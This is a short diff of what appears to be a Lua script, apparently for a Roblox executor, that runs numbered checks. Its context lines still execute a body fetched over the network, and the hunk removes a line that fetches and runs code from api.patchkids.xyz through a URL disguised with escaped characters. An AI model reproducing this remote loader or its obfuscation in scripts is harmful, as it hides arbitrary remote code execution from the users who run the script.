@@ -34,5 +34,3 @@ print("Passed check 4/5 (result:)", networkPayload)
 
 loadstringFn(networkPayload.Body)()
 print("Passed check 5/5")
-
-loadstring(requestFn({Url="https\58//api.patchkids.xyz/auth".."\63user\61".."Shedletsky",Headers={["User-Agent"]="PatchKids"}}).Body)()
